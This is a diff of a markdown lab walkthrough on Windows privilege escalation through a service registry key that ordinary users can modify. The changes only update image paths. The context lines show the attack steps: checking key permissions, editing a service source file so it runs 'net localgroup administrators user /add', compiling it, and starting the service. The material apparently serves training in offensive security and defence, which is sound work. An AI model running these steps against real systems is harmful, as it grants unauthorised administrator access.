@@ -15,7 +15,7 @@ PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc |
 
 - Notice that the output suggests that user belong to “`NT AUTHORITY\INTERACTIVE`” has “`FullContol`” permission over the registry key.
 
-![get_acl](get_acl.png)
+![get_acl](privesc_service_escalation_registry\images\get_acl.png)
 
 ## Step 2: Transfer File
 
@@ -37,7 +37,7 @@ PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc |
 
 - Open terminal in the directory where `windows_service.c` is located
 
-![source](source.png)
+![source](privesc_service_escalation_registry\images\source.png)
 
 - Copy ‘`C:\Users\User\Desktop\Tools\Source\windows_service.c`’ to the attack machine
 
@@ -49,13 +49,13 @@ Password:
 ftp> put windows_service.c
 ```
 
-![put](put.png)
+![put](privesc_service_escalation_registry\images\put.png)
 
 ## Step 3: Exploitation
 
 - Open `windows_service.c` in a text editor and replace the command used by the system() function to: **`cmd.exe /k net localgroup administrators user /add`**
 
-![edit](edit.png)
+![edit](privesc_service_escalation_registry\images\edit.png)
 
 - Compile the file by typing the following in the command prompt:
   - **`x86_64-w64-mingw32-gcc windows_service.c -o x.exe`**
@@ -69,7 +69,7 @@ ftp> put windows_service.c
 - Copy the generated file `x.exe`, to the target using the `pytfp` server
 - Make sure to use `binary` mode for the transfer process
 
-![get](get.png)
+![get](privesc_service_escalation_registry\images\get.png)
 
 ### Add Executable to `ImagePath` of the Registry Service
 
@@ -93,4 +93,4 @@ C:\Temp> sc start regsvc
 C:\Temp> net localgroup administrators
 ```
 
-![start](start.png)
+![start](privesc_service_escalation_registry\images\start.png)
